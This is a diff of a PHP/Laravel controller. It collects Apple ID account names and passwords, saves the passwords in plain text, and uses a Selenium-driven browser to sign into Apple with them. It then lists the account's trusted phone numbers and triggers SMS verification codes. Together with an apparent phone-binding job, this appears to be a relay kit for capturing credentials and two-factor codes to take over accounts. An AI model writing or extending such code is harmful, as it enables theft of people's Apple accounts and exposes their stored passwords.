@@ -9,20 +9,27 @@ use App\Apple\Service\Exception\AccountLockoutException;
 use App\Apple\Service\Exception\UnauthorizedException;
 use App\Apple\Service\Exception\VerificationCodeIncorrect;
 use App\Apple\Service\PhoneNumber\PhoneNumberFactory;
-use App\Apple\Service\User\UserFactory;
+use App\Apple\Service\User\User;
 use App\Events\AccountAuthFailEvent;
 use App\Events\AccountAuthSuccessEvent;
 use App\Events\AccountLoginSuccessEvent;
 use App\Http\Integrations\IpConnector\IpConnector;
-use App\Http\Integrations\IpConnector\Requests\Ip138Request;
 use App\Http\Integrations\IpConnector\Requests\PconLineRequest;
 use App\Http\Requests\VerifyAccountRequest;
 use App\Http\Requests\VerifyCodeRequest;
 use App\Jobs\BindAccountPhone;
 use App\Models\Account;
-use App\Models\Phone;
 use App\Models\SecuritySetting;
+use App\Selenium\AppleClient\AppleConnectorFactory;
+use App\Selenium\AppleClient\Elements\Phone;
+use App\Selenium\AppleClient\Page\SignIn\SignInSelectPhonePage;
+use App\Selenium\AppleClient\Request\SignInRequest;
+use App\Selenium\ConnectorManager;
+use App\Selenium\Repositories\RedisRepository;
+use App\Selenium\Repositories\RepositoriesInterface;
 use Carbon\Carbon;
+use Facebook\WebDriver\Exception\NoSuchElementException;
+use Facebook\WebDriver\Exception\TimeoutException;
 use GuzzleHttp\Exception\GuzzleException;
 use Illuminate\Contracts\View\Factory;
 use Illuminate\Contracts\View\View;
@@ -31,10 +38,10 @@ use Illuminate\Http\Client\ConnectionException;
 use Illuminate\Http\JsonResponse;
 use Illuminate\Http\Request;
 use Illuminate\Http\Response;
+use Illuminate\Redis\RedisManager;
 use Illuminate\Routing\Redirector;
 use Illuminate\Support\Facades\Cache;
 use Illuminate\Support\Facades\Cookie;
-use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Event;
 use Illuminate\Support\Facades\Log;
 use Illuminate\Support\Facades\Session;
@@ -42,18 +49,28 @@ use Illuminate\Support\Facades\Validator;
 use Illuminate\Validation\ValidationException;
 use libphonenumber\NumberParseException;
 use libphonenumber\PhoneNumberFormat;
+use Psr\SimpleCache\CacheInterface;
 use Saloon\Exceptions\Request\FatalRequestException;
 use Saloon\Exceptions\Request\RequestException;
 
 class IndexController extends Controller
 {
+
+    protected RedisRepository $redisRepositories;
+    protected ConnectorManager $connectorManager;
+
+
     public function __construct(
         protected readonly Request $request,
         private readonly AppleFactory $appleFactory,
         private readonly PhoneNumberFactory $phoneNumberFactory,
+        private readonly RedisManager $redisManager,
+        private readonly AppleConnectorFactory $factory,
+        private readonly CacheInterface $cache
     )
     {
-
+        $this->redisRepositories = new RedisRepository($this->redisManager->client());
+        $this->connectorManager = new ConnectorManager($this->redisRepositories,$this->factory);
     }
 
     protected function getAccount(): ?Account
@@ -122,6 +139,10 @@ class IndexController extends Controller
         }
     }
 
+    public function connector()
+    {
+    }
+
     /**
      * @param VerifyAccountRequest $request
      * @return JsonResponse
@@ -150,51 +171,49 @@ class IndexController extends Controller
             $accountName = $this->formatPhone($accountName);
         }
 
-        $guid = $request->cookie('Guid');
+        $guid = $request->cookie('Guid',null);
 
-        $apple = $this->appleFactory->create($guid);
+        $connector = $this->connectorManager->createConnector();
 
-        $apple->getUser()->add('accountName', $accountName);
+        $response = $connector->send(new SignInRequest());
 
-        $response = $apple->signin($accountName, $password);
+        /**
+         * @var \App\Selenium\AppleClient\Page\SignIn\SignInPage $page
+         */
+        $page = $response->getPage();
+
+        $page->inputAccountName($accountName);
+        $page->signInAccountName();
+
+        $page->inputPassword($password);
+        $authPage = $page->signInPassword();
 
         $account = Account::updateOrCreate([
             'account' => $accountName,
         ],[ 'password' => $password]);
 
-        $apple->getUser()->add('account', $account);
+        $user = new User($this->cache,$guid);
 
-        $error = $response->firstAuthServiceError()?->getMessage();
-        Session::flash('Error',$error);
+        Event::dispatch(new AccountLoginSuccessEvent(account: $account,description: "登录成功"));
 
-        Event::dispatch(new AccountLoginSuccessEvent(account: $account,description: "登录成功 {$error}"));
+        $this->connectorManager->add($guid,$connector);
 
-        if ($response->hasTrustedDevices() || $response->getTrustedPhoneNumbers()->count() === 0){
-            return $this->success(data: [
-                'Guid' => $guid,
-                'Devices' => true,
-                'Error' => $error,
-            ],code: 201);
-        }
+        if ($authPage instanceof SignInSelectPhonePage){
 
-        if ($response->getTrustedPhoneNumbers()->count() >= 2){
+            $phoneList = $authPage->getPhoneLists();
+
+            $user->setPhoneInfo(array_map(static fn(Phone $phone) => $phone->setElement(),$phoneList->all()));
+
             return $this->success(data: [
                 'Guid' => $guid,
                 'Devices' => false,
-                'Error' => $error,
             ],code: 202);
         }
 
-        $trustedPhoneNumbers = $response->getTrustedPhoneNumbers()->first();
-
         return $this->success(data: [
             'Guid' => $guid,
-            'Devices' => false,
-            'ID' => $trustedPhoneNumbers->getId(),
-            'Number' => $trustedPhoneNumbers->getNumberWithDialCode(),
-            'Error' => $error,
-        ],code: 203);
-
+            'Devices' => true,
+        ],code: 201);
     }
 
     public function auth(): Factory|Application|View|\Illuminate\Contracts\Foundation\Application
@@ -207,12 +226,13 @@ class IndexController extends Controller
      * @throws GuzzleException
      * @throws UnauthorizedException|ConnectionException
      */
-    public function authPhoneList(): Factory|Application|View|\Illuminate\Contracts\Foundation\Application|JsonResponse
+    public function authPhoneList(CacheInterface $cache): Factory|Application|View|\Illuminate\Contracts\Foundation\Application|JsonResponse
     {
-        $response = $this->getApple()->auth();
+        $guid = $this->request->input('Guid',null);
 
-        $trustedPhoneNumbers = $response->getTrustedPhoneNumbers();
-        return view('index.auth-phone-list',['trustedPhoneNumbers' => $trustedPhoneNumbers]);
+        $user = new User($cache,$guid);
+
+        return view('index.auth-phone-list',['trustedPhoneNumbers' => collect($user->getPhoneInfo())]);
     }
 
     /**
@@ -348,21 +368,30 @@ class IndexController extends Controller
     /**
      * 发送验证码
      * @return JsonResponse|Redirector
+     * @throws NoSuchElementException
+     * @throws TimeoutException
      * @throws ValidationException
-     * @throws \Exception
      */
     public function SendSms(): JsonResponse|Redirector
     {
         $params = Validator::make($this->request->all(), [
-            'ID' => 'required|integer|min:1'
+            'ID' => 'required|integer|min:0',
         ])->validated();
 
         try {
 
-            $response = $this->getApple()->sendPhoneSecurityCode((int) $params['ID']);
+
+            $guid = $this->request->input('Guid');
+
+            $connector = $this->connectorManager->getConnector($guid);
+
+            $page = new SignInSelectPhonePage($connector->webDriver());
+            $page->selectPhone($params['ID']);
+
+//            $user = new User($cache,$guid);
 
             $this->getAccount()
-                ->logs()
+                ?->logs()
                 ->create([
                     'action' => '发送手机验证码',
                     'description' => "发送手机验证码成功",
@@ -371,7 +400,7 @@ class IndexController extends Controller
         } catch (\Exception $e) {
 
             $this->getAccount()
-                ->logs()
+                ?->logs()
                 ->create([
                     'action' => '发送手机验证码',
                     'description' => "发送手机验证码失败:{$e->getMessage()}",
